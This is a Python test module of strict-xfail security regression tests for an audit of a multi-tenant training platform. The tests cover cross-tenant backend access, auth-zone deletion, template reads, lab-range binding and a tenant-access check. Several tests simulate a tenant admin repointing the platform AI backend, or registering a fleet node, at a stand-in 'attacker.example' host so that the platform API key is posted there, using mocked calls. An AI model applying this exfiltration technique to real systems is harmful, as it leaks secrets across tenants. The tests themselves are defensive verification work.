"""Companion oracles for the strict-xfail audit-#443 tests in test_audit_tenancy_443.py.

One companion per REAL oracle: a second input that pins the same secure behaviour from
another angle (a two-tenant matrix, a second role, or the boundary value). Each fails at
the base commit for the same finding its oracle states, marked ``audit443`` and
``xfail(strict=True)`` like the oracles, so an XPASS fails CI and the mark must be
dropped. Seeding follows test_platform_tenancy.py / the oracle module: a second tenant's
rows go straight into the session and ``acting_as`` is imported from the neighbouring
module by path; with PLATFORM_TENANT_ID unset nobody is the platform administrator
(app/rbac.py is_platform_admin fails closed), which is the precondition every
cross-tenant finding needs.

Companion map (oracle -> second angle):
- test_tenant_admin_cannot_reach_the_platform_backends
      -> both tenants' admins (matrix) read the platform backend by id, and the foreign
         admin deletes it — the by-id/delete routes the oracle's list-first failure
         never reaches.
- test_tenant_admin_cannot_exfiltrate_the_platform_key_via_test_generate
      -> the exfiltration run end to end: no gate asserted, the repointed backend is
         actually asked for a completion and the sealed platform key reaches the
         attacker URL as a Bearer header.
- test_tenant_admin_cannot_mine_the_key_through_set_primary_or_discover
      -> the discovery leak without touching the backend row: a tenant admin registers
         an attacker URL as a fleet node on the platform backend and discovery probes
         it with the unsealed platform key.
- test_foreign_tenant_admin_cannot_change_a_platform_default_zone
      -> the delete branch of the same ``_writable`` hole (the oracle fails on its PATCH
         assert first, so its DELETE is never exercised).
- test_listed_public_template_of_another_tenant_is_readable_by_id
      -> a second role: an Instructor (template:read, no admin) is listed a foreign
         public template and cannot read it by id either.
- test_listed_public_scenario_of_another_tenant_is_readable_by_id
      -> the boundary value: the NULL-tenant platform ("golden") scenario, listed by
         the same public filter, 404s on the by-id read like a foreign row.
- test_forge_fallback_never_binds_a_live_lab_range
      -> the two-tenant matrix: the same live-lab forge run as tenant B's admin, with
         the lab as tenant B's only range, so the unordered fallback's pick is
         deterministic there too.
- test_require_tenant_access_enforces_the_path_parameter
      -> a second input: a POST route wired exactly as the docstring example, plus a
         same-tenant positive control; the cross-tenant POST must 403.
"""

from __future__ import annotations

import uuid
from unittest.mock import AsyncMock, patch

import httpx
import pytest
import respx
from app.auth import CurrentUser, get_current_user
from app.course_releases.models import CourseRelease, CourseReleaseBlob
from app.db import get_db
from app.lab_sessions.models import ACTIVE as LAB_ACTIVE
from app.lab_sessions.models import LabSession
from app.models import (
    AIBackendConfig,
    AuthZonePolicy,
    Course,
    Exercise,
    Range,
    RangeState,
    Scenario,
    Template,
    Tenant,
    User,
    UserRole,
)
from app.secretbox import seal
from test_platform_tenancy import DEV_TENANT, OTHER_TENANT, acting_as

pytestmark = pytest.mark.audit443

PLATFORM_KEY = "sk-PLATFORM-SECRET-443"
ATTACKER = "http://attacker.example:9999"


def _second_tenant(db) -> None:
    """Tenant B. With PLATFORM_TENANT_ID unset, no admin is the platform administrator
    (app/rbac.py is_platform_admin fails closed), so both tenants' admins are strictly
    per-tenant — the precondition each cross-tenant finding here needs."""
    db.add(Tenant(id=uuid.UUID(OTHER_TENANT), name="Tenant B", slug="tenant-b"))
    db.flush()


def _platform_backend(db) -> AIBackendConfig:
    """The platform's one primary AI backend, with its sealed key (tenant_id NULL)."""
    b = AIBackendConfig(
        name="Platform AI",
        backend_type="openai",
        base_url="http://tn-mgmt01:8000/v1",
        api_key_encrypted=seal(PLATFORM_KEY),
        is_active=True,
        is_primary=True,
    )
    db.add(b)
    db.flush()
    return b


# ── ai_config.py:51 (high) — companions for TestAIConfigPlatformBoundary ──
class TestAIConfigPlatformBoundaryCompanions:
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: any tenant's admin controls the platform-wide AI backend "
        "and can exfiltrate its API key (ai_config.py:51) — companion",
    )
    def test_both_tenants_admins_reach_a_platform_backend_by_id(self, client, db_session, monkeypatch):
        """Matrix companion for
        test_tenant_admin_cannot_reach_the_platform_backends: both tenants' admins on
        the by-id read and the foreign admin on the delete — the routes the oracle's
        list-first failure (200 on GET /ai-config/backends) never reaches. ai_config.py
        has no per-row gate at all: _backend fetches any row for any AI_CONFIG_WRITE
        holder (rbac.py:192 gives every tenant's admin every Permission)."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        backend = _platform_backend(db_session)
        db_session.commit()
        with acting_as(UserRole.admin, tenant=DEV_TENANT):
            assert client.get(f"/ai-config/backends/{backend.id}").status_code == 403
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            assert client.get(f"/ai-config/backends/{backend.id}").status_code == 403
            assert client.delete(f"/ai-config/backends/{backend.id}").status_code == 403

    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: any tenant's admin can rewrite the platform-wide AI backend "
        "and have its sealed API key posted to a host they choose (ai_config.py:51) — "
        "companion",
    )
    def test_repointed_platform_backend_sends_the_platform_key_to_the_attacker(self, client, db_session, monkeypatch):
        """End-to-end companion for
        test_tenant_admin_cannot_exfiltrate_the_platform_key_via_test_generate: the
        oracle pins the missing gate on the repointing PATCH; this runs the leak itself.
        The repoint succeeds at base (200), so POST /ai-config/test-generate unseals the
        platform key (ai_config.py test_generate) and posts it as a Bearer header to
        ATTACKER (openai_compat.generate). The key must never reach an attacker-chosen
        URL: 403 and no call."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        backend = _platform_backend(db_session)
        db_session.commit()
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            client.patch(f"/ai-config/backends/{backend.id}", json={"base_url": ATTACKER})
            with respx.mock:
                route = respx.post(f"{ATTACKER}/v1/chat/completions").mock(
                    return_value=httpx.Response(200, json={"choices": [{"message": {"content": "ok"}}]})
                )
                resp = client.post("/ai-config/test-generate")
                assert resp.status_code == 403, resp.text
                assert route.called is False, "the platform AI key was posted to the repointed URL"

    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: any tenant's admin can rewrite the platform-wide AI backend "
        "and have its sealed API key posted to a host they choose (ai_config.py:51) — "
        "companion",
    )
    def test_registered_fleet_node_leaks_the_platform_key_to_its_url(self, client, db_session, monkeypatch):
        """Fleet-node companion for
        test_tenant_admin_cannot_mine_the_key_through_set_primary_or_discover: the
        oracle's PATCH-first chain never runs; here the tenant admin does not touch the
        platform row at all — they register an attacker URL as a fleet node on the
        platform backend (POST /backends/{id}/nodes, same missing gate) and discovery
        probes that URL with the unsealed platform key (ai_config.py discover_fleet_nodes
        -> _probe_node)."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        backend = _platform_backend(db_session)
        db_session.commit()
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            client.post(
                f"/ai-config/backends/{backend.id}/nodes",
                json={"node_name": "attacker-node", "url": ATTACKER},
            )
            with respx.mock:
                route = respx.route(host="attacker.example").mock(
                    return_value=httpx.Response(200, json={"data": [{"id": "agent"}]})
                )
                resp = client.post(f"/ai-config/backends/{backend.id}/discover")
                assert resp.status_code == 403, resp.text
                assert route.called is False, "discovery probed the attacker URL with the platform key"


# ── auth_zones.py:37 (medium) — companion for TestAuthZonePlatformDefaults ──
class TestAuthZonePlatformDefaultsCompanions:
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: any tenant's admin can rewrite or delete platform-default "
        "auth zones that gate registration for every tenant (auth_zones.py:37) — "
        "companion",
    )
    def test_foreign_tenant_admin_cannot_delete_a_platform_default_zone(self, client, db_session, monkeypatch):
        """Delete-branch companion for
        test_foreign_tenant_admin_cannot_change_a_platform_default_zone: the oracle
        fails on its PATCH assert, so its DELETE (line 197) is never exercised.
        ``_writable`` guards NULL-tenant rows with TENANT_UPDATE (rbac.py:192 gives it
        to every admin), so the foreign admin's delete succeeds at base (204) and the
        platform default that gates registration for every tenant is gone."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        shared = AuthZonePolicy(id=uuid.uuid4(), zone_name="platform-default-zone", tenant_id=None)
        db_session.add(shared)
        db_session.commit()
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            assert client.delete(f"/auth-zones/{shared.id}").status_code == 403


# ── templates.py:274 / scenarios.py:150 (low) — companions ───────────────
class TestSharedContentReadableByIdCompanions:
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: public/global templates are listed to other tenants but "
        "by-id reads 404, so a class can be built from an uninspectable template "
        "(templates.py:274) — companion",
    )
    def test_listed_foreign_public_template_is_unreadable_for_an_instructor(self, client, db_session):
        """Second-role companion for
        test_listed_public_template_of_another_tenant_is_readable_by_id: the oracle
        reads as the default admin; an Instructor holds template:read (rbac.py:194),
        builds classes on templates (classes/sessions.py:188), and gets the same split —
        the foreign public template is in their list but its by-id read 404s
        (get_owned is tenant-strict)."""
        _second_tenant(db_session)
        foreign_public = Template(
            name="pub",
            version="1.0",
            yaml="name: pub\nnodes: []\n",
            tenant_id=uuid.UUID(OTHER_TENANT),
            is_public=True,
        )
        db_session.add(foreign_public)
        db_session.commit()
        with acting_as(UserRole.instructor, tenant=DEV_TENANT):
            listed = {r["id"] for r in client.get("/templates").json()}
            assert str(foreign_public.id) in listed
            assert client.get(f"/templates/{foreign_public.id}").status_code == 200, "listed but unreadable"

    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: public/global templates and scenarios are listed to other "
        "tenants but by-id reads 404, so a class can be built from an uninspectable "
        "scenario (templates.py:274, scenarios.py:150) — companion",
    )
    def test_listed_platform_scenario_is_readable_by_id(self, client, db_session):
        """Boundary-value companion for
        test_listed_public_scenario_of_another_tenant_is_readable_by_id: the oracle
        covers a foreign-tenant public scenario; the boundary case is the NULL-tenant
        platform ("golden") scenario — listed by the same public filter
        (scenarios.py list) but 404 on the by-id read (scenarios.py:150 get_owned is
        tenant-strict)."""
        platform_scenario = Scenario(
            name="golden-scenario",
            yaml="name: golden-scenario\n",
            tenant_id=None,
            is_public=True,
        )
        db_session.add(platform_scenario)
        db_session.commit()
        listed = {r["id"] for r in client.get("/scenarios").json()}
        assert str(platform_scenario.id) in listed
        assert client.get(f"/scenarios/{platform_scenario.id}").status_code == 200, "listed but unreadable"


# ── exercise_forge.py:238 (medium) — companion for TestForgeDefaultRange ──
class TestForgeDefaultRangeCompanions:
    @patch("app.routers.exercise_forge._call_forge_ai", new_callable=AsyncMock)
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: forge with no range_id binds the exercise to an arbitrary "
        "tenant range, including a Student's live lab range (exercise_forge.py:238) — "
        "companion",
    )
    def test_forge_fallback_binds_tenant_b_live_lab_range(self, mock_ai, client, db_session, monkeypatch):
        """Two-tenant-matrix companion for
        test_forge_fallback_never_binds_a_live_lab_range: the oracle forges as the
        default tenant's user; here tenant B's admin forges and tenant B's Student has
        the live lab — tenant B's only range, so the unordered fallback
        (exercise_forge.py:238, no state filter, no lab-session exclusion, no ORDER BY)
        picks it deterministically. Refuse (409) or bind anything but the lab."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        tid = uuid.UUID(OTHER_TENANT)
        tpl = Template(name="Lab TPL B", version="1.0", yaml="nodes: []", tenant_id=tid)
        student = User(
            id=uuid.uuid4(),
            keycloak_id=f"kc-{uuid.uuid4().hex}",
            email=f"{uuid.uuid4().hex[:10]}@example.test",
            display_name="student",
            role=UserRole.student,
            tenant_id=tid,
        )
        course = Course(name="Lab course B", tenant_id=tid)
        db_session.add_all([tpl, student, course])
        db_session.flush()
        sha = uuid.uuid4().hex * 2
        db_session.add(CourseReleaseBlob(sha256=sha, size=1, data=b"x"))
        db_session.flush()
        release = CourseRelease(
            id=uuid.uuid4(),
            tenant_id=tid,
            course_id=course.id,
            catalogue_code="c",
            arc2_code="a",
            run_id="r",
            slug="s",
            title="T",
            version=1,
            release_digest=sha,
            learner_digest=sha,
            platform_digest=sha,
            instructor_digest=sha,
            blob_sha256=sha,
            meta="{}",
        )
        db_session.add(release)
        db_session.flush()
        # Tenant B's only range, so the unordered fallback (no ORDER BY) cannot pick
        # anything else.
        lab = Range(name="lab-b-student-live", template_id=tpl.id, tenant_id=tid, state=RangeState.running)
        db_session.add(lab)
        db_session.flush()
        db_session.add(
            LabSession(
                tenant_id=tid,
                user_id=student.id,
                release_id=release.id,
                activity_id="mod_001",
                state=LAB_ACTIVE,
                profile_id="p",
                profile_digest="0" * 64,
                backend="mock",
                range_id=lab.id,
            )
        )
        db_session.commit()

        mock_ai.return_value = (
            "name: APT29 Replay\ntimeline:\n  - inject: c2_beacon\n    t: '0:05'\n"
            "    technique: T1059.001\nobjectives:\n  - detect lateral movement",
            "gpt-4o",
        )
        payload = {
            "indicators": [
                {
                    "indicator_type": "domain",
                    "value": "evil-c2.example.com",
                    "severity": "critical",
                    "mitre_attack_ids": ["T1059.001"],
                }
            ],
            "difficulty": "advanced",
            "duration_minutes": 120,
            "objective_count": 5,
        }
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            resp = client.post("/exercise-forge/generate", json=payload)
        assert resp.status_code in (200, 409), resp.text  # the two outcomes the contract allows
        exercise_id = resp.json().get("exercise_id") if resp.status_code == 200 else None
        bound = db_session.get(Exercise, exercise_id).range_id if exercise_id else None
        assert bound != lab.id, (
            f"forge bound tenant B's exercise to their Student's live lab range (HTTP {resp.status_code}); "
            "Run would fire the scenario on it"
        )


# ── rbac.py:413 (low) — companion for TestRequireTenantAccess ────────────
class TestRequireTenantAccessCompanions:
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: require_tenant_access can never see the path parameter it "
        "is supposed to check and therefore always passes (rbac.py:413) — companion",
    )
    def test_require_tenant_access_enforces_the_path_parameter_on_post(self, db_session):
        """Second-input companion for
        test_require_tenant_access_enforces_the_path_parameter: a POST route wired
        exactly as the rbac.py docstring example, plus a same-tenant positive control.
        The dependency's kwargs.get(tenant_id_param) is always None (FastAPI never
        injects path params into a dependency's **kwargs), so the cross-tenant POST
        passes (200) where it must 403; the same-tenant POST is the control that shows
        the route itself works. As in the oracle, the coerced **kwargs first surface as
        a required query parameter, so the request carries it."""
        from app import rbac
        from fastapi import Depends, FastAPI
        from fastapi.testclient import TestClient

        who = CurrentUser(
            id=str(uuid.uuid4()),
            email="instructor@example.test",
            display_name="instructor",
            role=UserRole.instructor,
            tenant_id=DEV_TENANT,
            keycloak_id=f"kc-{uuid.uuid4().hex[:8]}",
        )
        mini = FastAPI()
        mini.dependency_overrides[get_current_user] = lambda: who
        mini.dependency_overrides[get_db] = lambda: db_session

        @mini.post("/tenants/{tenant_id}/runs")
        def start_tenant_run(
            tenant_id: uuid.UUID,
            user: CurrentUser = Depends(rbac.require_tenant_access("tenant_id")),
        ):
            return {"ok": True, "user": user.email}

        c = TestClient(mini)
        own = uuid.UUID(DEV_TENANT)
        other = uuid.UUID(OTHER_TENANT)
        # The kwargs query param satisfies the coerced **kwargs, so the dependency body
        # actually runs and the unreachable 403 branch is what is exercised.
        assert c.post(f"/tenants/{other}/runs", params={"kwargs": "{}"}).status_code == 403
        assert c.post(f"/tenants/{own}/runs", params={"kwargs": "{}"}).status_code == 200
